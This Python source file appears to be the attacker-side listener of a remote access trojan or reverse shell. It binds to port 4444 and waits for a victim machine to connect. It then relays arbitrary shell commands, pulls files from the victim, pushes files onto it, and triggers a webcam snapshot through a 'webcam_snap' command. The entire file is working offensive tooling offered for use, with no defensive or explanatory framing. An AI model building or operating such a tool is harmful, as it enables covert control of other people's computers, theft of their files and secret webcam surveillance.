import socket
import os
import tqdm
import sys

class Listening:
    def __init__(self, host, port):
        self.SERVER_HOST = host
        self.SERVER_PORT = port
        self.BUFFER_SIZE = 10240
        # create socket
        self.s = socket.socket()
        self.s.bind((self.SERVER_HOST, self.SERVER_PORT))
        self.s.listen(5)
        print(f"[*] Listening as {self.SERVER_HOST}:{self.SERVER_PORT}")
        self.client_socket, client_address = self.s.accept()
        print(f"[+] {client_address[0]}:{client_address[1]} Connect")
        print(self.client_socket.recv(self.BUFFER_SIZE).decode(), end='')
        # Set CMD utf-8
        self.client_socket.send("chcp 65001".encode())

    def download(self, localpath):
        rev = self.client_socket.recv(self.BUFFER_SIZE).decode()
        if rev == "Path doesn't exist!":
            return rev
        elif rev == "0":
            return "Broken file!"
        else:
            file_size = int(rev)
        self.client_socket.send("ok".encode())

        progress = tqdm.tqdm(range(file_size), f"Receiving {localpath}", unit="B", unit_scale=True, unit_divisor=1024)
        left = file_size
        with open(localpath, "wb") as f:
            while True:
                bytes_read = self.client_socket.recv(self.BUFFER_SIZE)
                f.write(bytes_read)
                left -= len(bytes_read)
                progress.update(len(bytes_read))
                if left == 0:
                    break
        return "success"

    def upload(self, localpath):
        f = open(localpath, "rb")
        filesize = os.path.getsize(localpath)
        self.client_socket.send(str(filesize).encode())
        if self.client_socket.recv(self.BUFFER_SIZE).decode() == "ok":
            while 1:
                byte_read = f.read(self.BUFFER_SIZE)
                if not byte_read:
                    break
                self.client_socket.sendall(byte_read)
        else:
            raise FileNotFoundError

    def run(self):
        while True:
            # get the command from prompt
            command = input("> ")
            if command.lower() == "exit":
                # if the command is exit, just break out of the loop
                break
            elif command[:8].lower() == "download":
                try:
                    filename, localpath = command[9:].split(" ")
                    self.client_socket.send("download ".encode() + filename.encode())
                    status = self.download(localpath)
                    print(status)
                except ValueError:
                    print("Invalid syntax")
                    continue
                except BrokenPipeError:
                    print("[-] Connection has been died..")
                    raise BrokenPipeError
                continue
            elif command[:6].lower() == "upload":
                try:
                    localpath, remotepath = command[7:].split(" ")
                    self.client_socket.send("upload ".encode() + remotepath.encode())
                    self.upload(localpath)
                except FileNotFoundError:
                    print("Upload failed! No such file")
                    continue
                except ValueError:
                    print("Invalid syntax!")
                    continue
                except BrokenPipeError:
                    print("[-] Connection has been died..")
                    raise BrokenPipeError
                continue
            elif command[:11].lower() == "webcam_snap":
                localpath = command[12:].strip()
                self.client_socket.send(command.encode())
                status = self.download(localpath)
                print(status)
                continue

            # send the command to the client
            self.client_socket.send(command.encode())

            # retrieve command results
            results = self.client_socket.recv(self.BUFFER_SIZE).decode("utf-8", "ignore")

            # print them
            print(results, end='')
        # close connection to the client
        self.client_socket.close()
        # close server connection
        self.s.close()


if __name__ == '__main__':
    l = Listening("0.0.0.0", 4444)
    l.run()